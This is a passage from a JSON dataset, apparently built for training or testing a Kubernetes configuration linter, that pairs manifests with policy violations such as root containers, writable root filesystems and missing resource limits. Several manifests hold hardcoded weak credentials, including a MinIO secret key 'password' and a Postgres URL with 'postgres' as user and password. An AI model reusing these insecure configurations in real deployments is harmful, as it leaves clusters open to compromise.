    "manifest_path": "data/manifests/the_stack_sample/sample_4420.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: oim-malloc-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n    command:\n    - sleep\n    - '1000000'\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: oim-malloc-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"my-frontend\" has memory limit 0"
  },
  {
    "id": "11485",
    "manifest_path": "data/manifests/the_stack_sample/sample_4421.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: goproxy\n  labels:\n    app: goproxy\nspec:\n  containers:\n  - name: goproxy\n    image: gcr.io/google_containers/goproxy:0.1\n    ports:\n    - containerPort: 8080\n    readinessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"goproxy\" does not have a read-only root file system"
  },
  {
    "id": "11486",
    "manifest_path": "data/manifests/the_stack_sample/sample_4421.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: goproxy\n  labels:\n    app: goproxy\nspec:\n  containers:\n  - name: goproxy\n    image: gcr.io/google_containers/goproxy:0.1\n    ports:\n    - containerPort: 8080\n    readinessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"goproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "11487",
    "manifest_path": "data/manifests/the_stack_sample/sample_4421.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: goproxy\n  labels:\n    app: goproxy\nspec:\n  containers:\n  - name: goproxy\n    image: gcr.io/google_containers/goproxy:0.1\n    ports:\n    - containerPort: 8080\n    readinessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"goproxy\" has cpu request 0"
  },
  {
    "id": "11488",
    "manifest_path": "data/manifests/the_stack_sample/sample_4421.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: goproxy\n  labels:\n    app: goproxy\nspec:\n  containers:\n  - name: goproxy\n    image: gcr.io/google_containers/goproxy:0.1\n    ports:\n    - containerPort: 8080\n    readinessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 8080\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"goproxy\" has memory limit 0"
  },
  {
    "id": "11489",
    "manifest_path": "data/manifests/the_stack_sample/sample_4422.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flux-helm-operator\n  namespace: weave\n  labels:\n    app: flux-helm-operator\n    weave-cloud-component: helm-operator\nspec:\n  selector:\n    matchLabels:\n      app: flux-helm-operator\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: flux-helm-operator\n    spec:\n      serviceAccountName: weave-flux\n      volumes:\n      - name: git-key\n        secret:\n          defaultMode: 256\n          secretName: flux-git-deploy\n      containers:\n      - name: flux-helm-operator\n        image: docker.io/weaveworks/helm-operator:0.8.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --git-timeout=20s\n        - --charts-sync-interval=3m\n        - --update-chart-deps=true\n        - --tiller-namespace=kube-system\n        volumeMounts:\n        - name: git-key\n          mountPath: /etc/fluxd/ssh\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"flux-helm-operator\" does not have a read-only root file system"
  },
  {
    "id": "11490",
    "manifest_path": "data/manifests/the_stack_sample/sample_4422.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flux-helm-operator\n  namespace: weave\n  labels:\n    app: flux-helm-operator\n    weave-cloud-component: helm-operator\nspec:\n  selector:\n    matchLabels:\n      app: flux-helm-operator\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: flux-helm-operator\n    spec:\n      serviceAccountName: weave-flux\n      volumes:\n      - name: git-key\n        secret:\n          defaultMode: 256\n          secretName: flux-git-deploy\n      containers:\n      - name: flux-helm-operator\n        image: docker.io/weaveworks/helm-operator:0.8.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --git-timeout=20s\n        - --charts-sync-interval=3m\n        - --update-chart-deps=true\n        - --tiller-namespace=kube-system\n        volumeMounts:\n        - name: git-key\n          mountPath: /etc/fluxd/ssh\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"weave-flux\" not found"
  },
  {
    "id": "11491",
    "manifest_path": "data/manifests/the_stack_sample/sample_4422.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flux-helm-operator\n  namespace: weave\n  labels:\n    app: flux-helm-operator\n    weave-cloud-component: helm-operator\nspec:\n  selector:\n    matchLabels:\n      app: flux-helm-operator\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: flux-helm-operator\n    spec:\n      serviceAccountName: weave-flux\n      volumes:\n      - name: git-key\n        secret:\n          defaultMode: 256\n          secretName: flux-git-deploy\n      containers:\n      - name: flux-helm-operator\n        image: docker.io/weaveworks/helm-operator:0.8.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --git-timeout=20s\n        - --charts-sync-interval=3m\n        - --update-chart-deps=true\n        - --tiller-namespace=kube-system\n        volumeMounts:\n        - name: git-key\n          mountPath: /etc/fluxd/ssh\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 512Mi\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"flux-helm-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "11492",
    "manifest_path": "data/manifests/the_stack_sample/sample_4423.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4671\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11493",
    "manifest_path": "data/manifests/the_stack_sample/sample_4423.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4671\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11494",
    "manifest_path": "data/manifests/the_stack_sample/sample_4423.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4671\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11495",
    "manifest_path": "data/manifests/the_stack_sample/sample_4423.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4671\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11496",
    "manifest_path": "data/manifests/the_stack_sample/sample_4423.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4671\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11497",
    "manifest_path": "data/manifests/the_stack_sample/sample_4424.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11498",
    "manifest_path": "data/manifests/the_stack_sample/sample_4424.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"slave\" does not have a read-only root file system"
  },
  {
    "id": "11499",
    "manifest_path": "data/manifests/the_stack_sample/sample_4424.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"slave\" is not set to runAsNonRoot"
  },
  {
    "id": "11500",
    "manifest_path": "data/manifests/the_stack_sample/sample_4424.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-slave\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: slave\n      tier: backend\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: slave\n        tier: backend\n    spec:\n      containers:\n      - name: slave\n        image: gcr.io/google_samples/gb-redisslave:v1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"slave\" has memory limit 0"
  },
  {
    "id": "11501",
    "manifest_path": "data/manifests/the_stack_sample/sample_4425.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  containers:\n  - name: main\n    image: minio/minio:RELEASE.2019-12-17T23-16-33Z\n    env:\n    - name: MINIO_ACCESS_KEY\n      value: admin\n    - name: MINIO_SECRET_KEY\n      value: password\n    ports:\n    - containerPort: 9000\n    command:\n    - minio\n    - server\n    - /data\n    readinessProbe:\n      httpGet:\n        path: /minio/health/ready\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      httpGet:\n        path: /minio/health/live\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"main\" found"
  },
  {
    "id": "11502",
    "manifest_path": "data/manifests/the_stack_sample/sample_4425.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  containers:\n  - name: main\n    image: minio/minio:RELEASE.2019-12-17T23-16-33Z\n    env:\n    - name: MINIO_ACCESS_KEY\n      value: admin\n    - name: MINIO_SECRET_KEY\n      value: password\n    ports:\n    - containerPort: 9000\n    command:\n    - minio\n    - server\n    - /data\n    readinessProbe:\n      httpGet:\n        path: /minio/health/ready\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      httpGet:\n        path: /minio/health/live\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "11503",
    "manifest_path": "data/manifests/the_stack_sample/sample_4425.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  containers:\n  - name: main\n    image: minio/minio:RELEASE.2019-12-17T23-16-33Z\n    env:\n    - name: MINIO_ACCESS_KEY\n      value: admin\n    - name: MINIO_SECRET_KEY\n      value: password\n    ports:\n    - containerPort: 9000\n    command:\n    - minio\n    - server\n    - /data\n    readinessProbe:\n      httpGet:\n        path: /minio/health/ready\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      httpGet:\n        path: /minio/health/live\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "11504",
    "manifest_path": "data/manifests/the_stack_sample/sample_4425.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  containers:\n  - name: main\n    image: minio/minio:RELEASE.2019-12-17T23-16-33Z\n    env:\n    - name: MINIO_ACCESS_KEY\n      value: admin\n    - name: MINIO_SECRET_KEY\n      value: password\n    ports:\n    - containerPort: 9000\n    command:\n    - minio\n    - server\n    - /data\n    readinessProbe:\n      httpGet:\n        path: /minio/health/ready\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      httpGet:\n        path: /minio/health/live\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "11505",
    "manifest_path": "data/manifests/the_stack_sample/sample_4425.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  containers:\n  - name: main\n    image: minio/minio:RELEASE.2019-12-17T23-16-33Z\n    env:\n    - name: MINIO_ACCESS_KEY\n      value: admin\n    - name: MINIO_SECRET_KEY\n      value: password\n    ports:\n    - containerPort: 9000\n    command:\n    - minio\n    - server\n    - /data\n    readinessProbe:\n      httpGet:\n        path: /minio/health/ready\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      httpGet:\n        path: /minio/health/live\n        port: 9000\n      initialDelaySeconds: 5\n      periodSeconds: 10\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "11506",
    "manifest_path": "data/manifests/the_stack_sample/sample_4426.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: canary-by-config-change\n  labels:\n    app: canary-by-config-change\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: canary-by-config-change\n      pipecd.dev/variant: primary\n  template:\n    metadata:\n      labels:\n        app: canary-by-config-change\n        pipecd.dev/variant: primary\n    spec:\n      containers:\n      - name: helloworld\n        image: ghcr.io/pipe-cd/helloworld:v0.30.0\n        args:\n        - server\n        ports:\n        - containerPort: 9085\n        volumeMounts:\n        - name: config\n          mountPath: /etc/pipecd-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: canary-by-config-change\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11507",
    "manifest_path": "data/manifests/the_stack_sample/sample_4426.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: canary-by-config-change\n  labels:\n    app: canary-by-config-change\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: canary-by-config-change\n      pipecd.dev/variant: primary\n  template:\n    metadata:\n      labels:\n        app: canary-by-config-change\n        pipecd.dev/variant: primary\n    spec:\n      containers:\n      - name: helloworld\n        image: ghcr.io/pipe-cd/helloworld:v0.30.0\n        args:\n        - server\n        ports:\n        - containerPort: 9085\n        volumeMounts:\n        - name: config\n          mountPath: /etc/pipecd-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: canary-by-config-change\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"helloworld\" does not have a read-only root file system"
  },
  {
    "id": "11508",
    "manifest_path": "data/manifests/the_stack_sample/sample_4426.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: canary-by-config-change\n  labels:\n    app: canary-by-config-change\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: canary-by-config-change\n      pipecd.dev/variant: primary\n  template:\n    metadata:\n      labels:\n        app: canary-by-config-change\n        pipecd.dev/variant: primary\n    spec:\n      containers:\n      - name: helloworld\n        image: ghcr.io/pipe-cd/helloworld:v0.30.0\n        args:\n        - server\n        ports:\n        - containerPort: 9085\n        volumeMounts:\n        - name: config\n          mountPath: /etc/pipecd-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: canary-by-config-change\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"helloworld\" is not set to runAsNonRoot"
  },
  {
    "id": "11509",
    "manifest_path": "data/manifests/the_stack_sample/sample_4426.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: canary-by-config-change\n  labels:\n    app: canary-by-config-change\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: canary-by-config-change\n      pipecd.dev/variant: primary\n  template:\n    metadata:\n      labels:\n        app: canary-by-config-change\n        pipecd.dev/variant: primary\n    spec:\n      containers:\n      - name: helloworld\n        image: ghcr.io/pipe-cd/helloworld:v0.30.0\n        args:\n        - server\n        ports:\n        - containerPort: 9085\n        volumeMounts:\n        - name: config\n          mountPath: /etc/pipecd-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: canary-by-config-change\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"helloworld\" has cpu request 0"
  },
  {
    "id": "11510",
    "manifest_path": "data/manifests/the_stack_sample/sample_4426.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: canary-by-config-change\n  labels:\n    app: canary-by-config-change\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: canary-by-config-change\n      pipecd.dev/variant: primary\n  template:\n    metadata:\n      labels:\n        app: canary-by-config-change\n        pipecd.dev/variant: primary\n    spec:\n      containers:\n      - name: helloworld\n        image: ghcr.io/pipe-cd/helloworld:v0.30.0\n        args:\n        - server\n        ports:\n        - containerPort: 9085\n        volumeMounts:\n        - name: config\n          mountPath: /etc/pipecd-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: canary-by-config-change\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"helloworld\" has memory limit 0"
  },
  {
    "id": "11511",
    "manifest_path": "data/manifests/the_stack_sample/sample_4429.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: productcatalogservice\nspec:\n  selector:\n    matchLabels:\n      app: productcatalogservice\n  template:\n    metadata:\n      labels:\n        app: productcatalogservice\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/google-samples/microservices-demo/productcatalogservice:v0.1.3\n        ports:\n        - containerPort: 3550\n        env:\n        - name: PORT\n          value: '3550'\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:3550\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:3550\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "11512",
    "manifest_path": "data/manifests/the_stack_sample/sample_4429.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: productcatalogservice\nspec:\n  selector:\n    matchLabels:\n      app: productcatalogservice\n  template:\n    metadata:\n      labels:\n        app: productcatalogservice\n    spec:\n      containers:\n      - name: server\n        image: gcr.io/google-samples/microservices-demo/productcatalogservice:v0.1.3\n        ports:\n        - containerPort: 3550\n        env:\n        - name: PORT\n          value: '3550'\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:3550\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:3550\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "11513",
    "manifest_path": "data/manifests/the_stack_sample/sample_4431.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-git-polling\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: tekton-utils\n        containers:\n        - name: polling\n          image: registry.cn-huhehaote.aliyuncs.com/feng-566/tekton-git-polling:v0.0.1\n          imagePullPolicy: IfNotPresent\n          args:\n          - --repo=https://github.com/win5do/tekton-cicd-demo.git\n          - --username=$(username)\n          - --password=$(password)\n          - --branch=*\n          - --range=300\n          - --template=/opt/configmaps/tpl/pipelineRunTemplate\n          env:\n          - name: username\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: username\n          - name: password\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: password\n          volumeMounts:\n          - name: tpl\n            mountPath: /opt/configmaps/tpl\n            readOnly: true\n        volumes:\n        - name: tpl\n          configMap:\n            name: pr-tpl\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"polling\" does not have a read-only root file system"
  },
  {
    "id": "11514",
    "manifest_path": "data/manifests/the_stack_sample/sample_4431.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-git-polling\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: tekton-utils\n        containers:\n        - name: polling\n          image: registry.cn-huhehaote.aliyuncs.com/feng-566/tekton-git-polling:v0.0.1\n          imagePullPolicy: IfNotPresent\n          args:\n          - --repo=https://github.com/win5do/tekton-cicd-demo.git\n          - --username=$(username)\n          - --password=$(password)\n          - --branch=*\n          - --range=300\n          - --template=/opt/configmaps/tpl/pipelineRunTemplate\n          env:\n          - name: username\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: username\n          - name: password\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: password\n          volumeMounts:\n          - name: tpl\n            mountPath: /opt/configmaps/tpl\n            readOnly: true\n        volumes:\n        - name: tpl\n          configMap:\n            name: pr-tpl\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tekton-utils\" not found"
  },
  {
    "id": "11515",
    "manifest_path": "data/manifests/the_stack_sample/sample_4431.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-git-polling\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: tekton-utils\n        containers:\n        - name: polling\n          image: registry.cn-huhehaote.aliyuncs.com/feng-566/tekton-git-polling:v0.0.1\n          imagePullPolicy: IfNotPresent\n          args:\n          - --repo=https://github.com/win5do/tekton-cicd-demo.git\n          - --username=$(username)\n          - --password=$(password)\n          - --branch=*\n          - --range=300\n          - --template=/opt/configmaps/tpl/pipelineRunTemplate\n          env:\n          - name: username\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: username\n          - name: password\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: password\n          volumeMounts:\n          - name: tpl\n            mountPath: /opt/configmaps/tpl\n            readOnly: true\n        volumes:\n        - name: tpl\n          configMap:\n            name: pr-tpl\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"polling\" is not set to runAsNonRoot"
  },
  {
    "id": "11516",
    "manifest_path": "data/manifests/the_stack_sample/sample_4431.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-git-polling\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: tekton-utils\n        containers:\n        - name: polling\n          image: registry.cn-huhehaote.aliyuncs.com/feng-566/tekton-git-polling:v0.0.1\n          imagePullPolicy: IfNotPresent\n          args:\n          - --repo=https://github.com/win5do/tekton-cicd-demo.git\n          - --username=$(username)\n          - --password=$(password)\n          - --branch=*\n          - --range=300\n          - --template=/opt/configmaps/tpl/pipelineRunTemplate\n          env:\n          - name: username\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: username\n          - name: password\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: password\n          volumeMounts:\n          - name: tpl\n            mountPath: /opt/configmaps/tpl\n            readOnly: true\n        volumes:\n        - name: tpl\n          configMap:\n            name: pr-tpl\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"polling\" has cpu request 0"
  },
  {
    "id": "11517",
    "manifest_path": "data/manifests/the_stack_sample/sample_4431.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-git-polling\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: tekton-utils\n        containers:\n        - name: polling\n          image: registry.cn-huhehaote.aliyuncs.com/feng-566/tekton-git-polling:v0.0.1\n          imagePullPolicy: IfNotPresent\n          args:\n          - --repo=https://github.com/win5do/tekton-cicd-demo.git\n          - --username=$(username)\n          - --password=$(password)\n          - --branch=*\n          - --range=300\n          - --template=/opt/configmaps/tpl/pipelineRunTemplate\n          env:\n          - name: username\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: username\n          - name: password\n            valueFrom:\n              secretKeyRef:\n                name: git-auth\n                key: password\n          volumeMounts:\n          - name: tpl\n            mountPath: /opt/configmaps/tpl\n            readOnly: true\n        volumes:\n        - name: tpl\n          configMap:\n            name: pr-tpl\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"polling\" has memory limit 0"
  },
  {
    "id": "11518",
    "manifest_path": "data/manifests/the_stack_sample/sample_4432.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sbdemo-apserver\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sbdemo-apserver\n  template:\n    metadata:\n      labels:\n        app: sbdemo-apserver\n    spec:\n      containers:\n      - name: apserver\n        image: dayan888/springdemo:apserver\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /login\n            port: 8080\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prd\n        - name: DB_URL\n          value: jdbc:postgresql://sbdemo-postgres-service:5432/demodb?user=postgres&password=postgres\n        - name: PIC_DIR\n          value: /opt/picDir\n        - name: REDIS_HOST\n          value: sbdemo-redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        volumeMounts:\n        - mountPath: /opt/picDir\n          name: apserver-pvc\n      volumes:\n      - name: apserver-pvc\n        persistentVolumeClaim:\n          claimName: sbdemo-nfs-pvc\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11519",
    "manifest_path": "data/manifests/the_stack_sample/sample_4432.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sbdemo-apserver\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sbdemo-apserver\n  template:\n    metadata:\n      labels:\n        app: sbdemo-apserver\n    spec:\n      containers:\n      - name: apserver\n        image: dayan888/springdemo:apserver\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /login\n            port: 8080\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prd\n        - name: DB_URL\n          value: jdbc:postgresql://sbdemo-postgres-service:5432/demodb?user=postgres&password=postgres\n        - name: PIC_DIR\n          value: /opt/picDir\n        - name: REDIS_HOST\n          value: sbdemo-redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        volumeMounts:\n        - mountPath: /opt/picDir\n          name: apserver-pvc\n      volumes:\n      - name: apserver-pvc\n        persistentVolumeClaim:\n          claimName: sbdemo-nfs-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"apserver\" does not have a read-only root file system"
  },
  {
    "id": "11520",
    "manifest_path": "data/manifests/the_stack_sample/sample_4432.yaml",
